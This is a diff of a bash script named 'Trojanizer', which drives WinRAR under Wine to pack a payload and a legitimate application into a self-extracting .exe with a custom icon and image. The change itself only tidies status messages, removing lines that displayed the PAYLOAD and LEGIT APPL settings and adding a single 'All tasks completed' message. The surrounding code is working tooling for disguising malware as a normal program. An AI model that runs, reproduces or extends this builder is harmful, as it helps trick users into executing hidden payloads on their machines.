@@ -390,7 +390,6 @@ sleep 2
         sed -i 's|/|\\|g' $IPATH/output/rep.log
         LPATH=`cat $IPATH/output/rep.log`
         rm $IPATH/output/rep.log > /dev/null 2>&1
-        echo ${GreenF}[☆]${white}" Trojanizer : tasks completed .."${Reset};
         echo ""
         #
         # Wine + Winrar onelinner bash command ..
@@ -398,7 +397,6 @@ sleep 2
         $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH -iimageZ:$LPATH -r- -ed -s -sfx -y $N4m3
         echo ""
       else
-        echo ${GreenF}[☆]${white}" Trojanizer : tasks completed .."${Reset};
         echo ""
         #
         # Wine + Winrar onelinner bash command ..
@@ -422,7 +420,6 @@ sleep 2
         sed -i 's|/|\\|g' $IPATH/output/rep.log
         LPATH=`cat $IPATH/output/rep.log`
         rm $IPATH/output/rep.log > /dev/null 2>&1
-        echo ${GreenF}[☆]${white}" Trojanizer : tasks completed .."${Reset};
         echo ""
         #
         # Wine + Winrar onelinner bash command ..
@@ -430,7 +427,6 @@ sleep 2
         $arch "$WINRAR_PATH" a -c -z$IPATH/bin/xsf.conf -iiconZ:$BPATH\\bin\\$IcOn -iimageZ:$LPATH -r- -ed -s -sfx -y $N4m3
         echo ""
       else
-        echo ${GreenF}[☆]${white}" Trojanizer : tasks completed .."${Reset};
         echo ""
         #
         # Wine + Winrar onelinner bash command ..
@@ -447,15 +443,8 @@ sleep 2
 #
 rm $IPATH/output/$ST_O > /dev/null 2>&1
 rm $IPATH/output/$ST_D > /dev/null 2>&1
+echo ${GreenF}[☆]${white}" Trojanizer : All tasks completed .."${Reset};
 zenity --info --title="☠ Trojanizer ☠" --text "Your sfx archive:\n'$IPATH/output/$N4m3.exe'" --width 380 > /dev/null 2>&1
-#
-# Display final settings to user
-#
-echo ${BlueF}[☆]${white}" PAYLOAD      : ${BlueF} $ST_O"${Reset};
-echo ${BlueF}[☆]${white}" LEGIT APPL   : ${BlueF} $ST_D"${Reset};
-echo ${BlueF}[☆]${white}" SFX FILE     : ${BlueF} $N4m3.exe"${Reset};
-echo ${BlueF}[☆]${white}" SFX STORAGE  : ${BlueF} $IPATH/output/$N4m3.exe"${Reset};
-echo ""
 sleep 2
 cd $IPATH
 
